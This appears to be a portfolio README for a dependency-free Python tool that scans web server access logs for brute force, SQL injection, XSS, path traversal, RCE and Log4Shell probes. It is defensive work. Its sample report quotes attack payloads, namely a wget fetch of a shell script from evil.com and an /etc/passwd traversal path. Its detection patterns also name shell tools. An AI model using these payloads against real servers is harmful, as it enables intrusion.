# Cybersecurity Log Analyzer

A CLI tool that reads Apache/Nginx access logs and tells you which IPs are up to no good — brute-force attempts, SQL injection probes, RCE payloads, the usual. Built in pure Python, no dependencies.

---

## Why I built this

Web server logs are genuinely useful. Every attack attempt, every scanner, every password spray — it's all sitting there in `access.log`. The problem is that a busy server writes thousands of lines per hour, and manually grepping through them after something goes wrong is not a great time.

I wanted a tool that could chew through a log file, find the patterns that actually matter, and spit out a report I could share without needing to explain how to read raw log lines. This is that tool.

It's also a portfolio project, so I tried to write it in a way that's easy to follow if someone else reads the code — clean separation between parsing, detection, and reporting, no global state, tests for everything.

---

## What it detects

| Type | Severity | How |
|---|---|---|
| RCE probes | CRITICAL (10) | Shell commands in the request path — `wget`, `curl`, `/bin/bash`, `powershell` etc. |
| SQL injection | CRITICAL (9) | SQL keywords in the path or User-Agent string |
| Brute force | CRITICAL (9) | Too many 401/403 responses from the same IP in the same log window |
| Path traversal | HIGH (8) | `../` patterns, `/etc/passwd`, Windows system paths |
| XSS attempts | HIGH (7) | Script tags, event handlers, `document.cookie` in path or referrer |
| Scanner detection | MEDIUM (5) | Known tool User-Agents: sqlmap, nikto, nuclei, gobuster, hydra, metasploit |
| Suspicious methods | LOW (3) | `DELETE`, `PUT`, `TRACE`, `CONNECT`, `PATCH` on endpoints that shouldn't see them |

Scores are cumulative per IP, so if the same address triggers multiple rules it climbs toward the top of the suspicious IPs list.

---

## Quickstart

```bash
# You need Python 3.8+. Check with:
python --version

# Clone the repo
git clone https://github.com/yourusername/log-analyzer.git
cd log-analyzer

# Try it immediately with built-in sample data
python main.py --sample

# Point it at a real log file
python main.py -f /var/log/nginx/access.log

# Save an HTML report you can open in the browser
python main.py -f access.log -o report -fmt html

# Lower the brute-force threshold if you want earlier warnings
python main.py -f access.log --brute-threshold 5
```

No `pip install` needed. Everything it uses ships with Python.

---

## Sample terminal output

```
═══════════════════════════════════════════════════════════════════════════════
 CYBERSECURITY LOG ANALYSIS REPORT
═══════════════════════════════════════════════════════════════════════════════
  Log window : 10/Jun/2024:08:01:12  →  10/Jun/2024:08:08:10
  Requests   : 26,000
  Unique IPs : 7

── HTTP Status Code Distribution ──────────────────────────────────────────────
  2xx  ████████████████████████████████ 24,180
  4xx  ████ 1,640
  5xx  ██ 180

── Threat Event Details ────────────────────────────────────────────────────────
    1. [CRITICAL ] score=10  IP=45.33.32.156    type=RCE_PROBE
       → Remote Code Execution pattern found in request path.
       ✎ /cgi-bin/test.cgi?cmd=;wget%20http://evil.com/shell.sh

    2. [CRITICAL ] score=9   IP=10.0.0.5        type=BRUTE_FORCE
       → IP 10.0.0.5 triggered 12 auth failures (threshold: 10).
       ✎ 12 requests with 401/403 status

    3. [HIGH     ] score=8   IP=172.16.0.99     type=PATH_TRAVERSAL
       → Directory/path traversal attempt detected.
       ✎ /files/../../../etc/passwd

── Most Suspicious IPs ─────────────────────────────────────────────────────────
  45.33.32.156          cumulative score = 25
  172.16.0.99           cumulative score = 16
  10.0.0.5              cumulative score = 9
═══════════════════════════════════════════════════════════════════════════════
```

---

## How it's structured

```
log-analyzer/
├── main.py                  ← CLI wiring, nothing else
├── core/
│   └── models.py            ← Shared dataclasses (LogEntry, ThreatEvent, AnalysisReport)
├── ingestion/
│   ├── parser.py            ← Converts raw log lines into LogEntry objects
│   └── sample_data.py       ← Generates a sample log that covers all 7 attack types
├── detection/
│   ├── signatures.py        ← Every detection rule lives here
│   └── detector.py          ← Runs signatures against entries, handles brute-force
├── reporting/
│   ├── reporter.py          ← Aggregates results, renders terminal output
│   └── formatters.py        ← Writes JSON / CSV / HTML files
└── tests/
    ├── conftest.py
    ├── test_ingestion.py
    ├── test_detection.py
    └── test_reporting.py
```

The data flows in one direction: `ingestion → detection → reporting`. None of those packages import from each other, only from `core/models.py`. That makes it straightforward to swap out or test any layer in isolation.

---

## The detection engine

The part I spent the most time thinking about is how signatures work.

The naive version has a separate `_check_sqli()`, `_check_xss()`, `_check_rce()` method for each attack type, each one hard-coding the severity, the score, and which log field to search. Adding rule number eight means editing the detector file. Adding rule number twenty means the detector becomes a sprawling mess.

Instead, each rule is a small frozen dataclass in `signatures.py`:

```python
ThreatSignature(
    threat_type    = "SQL_INJECTION",
    severity       = "CRITICAL",
    severity_score = 9,
    pattern        = _SQLI,                            # compiled regex
    extract        = lambda e: e.path + " " + e.user_agent,  # what to search
    description    = "SQL Injection pattern detected: URI or User-Agent.",
)
```

The `extract` callable is the interesting bit — instead of the detector deciding which field to check for each threat type, each signature tells the engine where to look. SQLi checks both `path` and `user_agent` because attackers inject through both. XSS checks `path` and `referrer`. RCE only needs `path`. The detector itself is just a loop:

```python
for sig in signatures.SIGNATURES:
    target = sig.extract(entry)
    if sig.pattern.search(target):
        self._emit(...)
```

That's the whole engine. If you want to add a new rule, you add one entry to the `SIGNATURES` tuple in `signatures.py` and nothing else changes.

**Brute-force is the exception.** You can't detect it by looking at a single log line — you need to see that the same IP has failed authentication 10+ times across the entire log window. So that runs as a second pass after all entries are processed, accumulating 401/403 failures per IP in a dictionary and triggering once at the end if the threshold is crossed.

---

## Adding a new rule

Say you want to catch Log4Shell probes (`${jndi:...}` in headers):

```python
# detection/signatures.py

# 1. Add the compiled pattern near the other patterns
_LOG4SHELL = re.compile(r"\$\{jndi:", re.IGNORECASE)

# 2. Add one entry to SIGNATURES
ThreatSignature(
    threat_type    = "LOG4SHELL_PROBE",
    severity       = "CRITICAL",
    severity_score = 10,
    pattern        = _LOG4SHELL,
    extract        = lambda e: e.path + " " + e.user_agent,
    description    = "Log4Shell JNDI injection attempt (CVE-2021-44228).",
),
```

That's it. The detector picks it up automatically, the reporter includes it in output, and the signature registry tests in `test_detection.py` will validate its structure on the next test run without any changes.

---

## CLI reference

```
python main.py [options]

  -f, --file PATH          Log file to analyse
  -o, --output NAME        Base name for the output file (no extension)
  -fmt, --format FORMAT    json | csv | html  (default: json)
  --sample                 Use built-in sample data instead of a real file
  --brute-threshold N      Auth failures before brute-force alert (default: 10)
```

---

## Output formats

**Terminal** is always active — colour-coded by severity, with ASCII bars for status code distribution.

**JSON** (`-fmt json`) gives you everything in a structured format: metadata, top talkers, status breakdown, threat summary, and the full event list. If you're feeding results into something else (Splunk, a webhook, a script), this is the one to use.

**CSV** (`-fmt csv`) is one row per threat event. Open it in Excel, filter by severity, sort by score — works without any configuration.

**HTML** (`-fmt html`) generates a self-contained dark-mode dashboard. No server, no internet connection needed. One file you can attach to an email or drop in a Slack message.

---

## Running the tests

```bash
pip install pytest

# Full suite
pytest tests/ -v

# Just detection tests
pytest tests/test_detection.py -v

# With coverage
pip install pytest-cov
pytest tests/ --cov=. --cov-report=term-missing
```

There are 60+ tests split across three files:

- `test_ingestion.py` — field extraction, error counting, empty files, the `parse_lines()` classmethod
- `test_detection.py` — signature registry validation, regex matching against real payloads, end-to-end detection, brute-force stateful logic, false positive checks
- `test_reporting.py` — aggregation metrics, all three export formats, the routing logic

The signature registry tests are parametrized over `SIGNATURES` directly, so any new rule you add gets automatically checked for valid severity labels, score range, and working extract functions — no test boilerplate required.

---

## Requirements

Python 3.8 or newer. No third-party packages for running the tool itself. `pytest` for tests only.

```bash
pip install pytest
```

---

## License

MIT — do whatever you want with it.

---

## Author

*Yusuf Sinan Kara*
